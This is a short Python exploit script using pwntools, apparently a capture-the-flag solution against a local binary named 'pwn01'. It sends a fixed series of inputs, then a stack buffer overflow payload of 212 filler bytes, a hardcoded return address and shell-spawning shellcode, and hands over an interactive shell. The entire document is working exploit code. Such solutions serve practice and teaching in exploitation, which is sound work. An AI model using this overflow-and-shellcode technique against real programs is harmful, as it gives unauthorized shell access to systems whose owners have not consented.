from pwn import *

if __name__ == '__main__':
    addr = './pwn01'
    options = b'25223553454143334223423431253214215244255'
    p = process([addr])
    for ele in options:
        a = int.to_bytes(ele, byteorder='little', length=1)
        # print(a)
        p.sendline(int.to_bytes(ele, byteorder='little', length=1))
    shellcode = asm(shellcraft.sh())
    payload = b'A' * 212 + p32(0x0805b497) + shellcode
    p.sendline(payload)
    p.interactive()
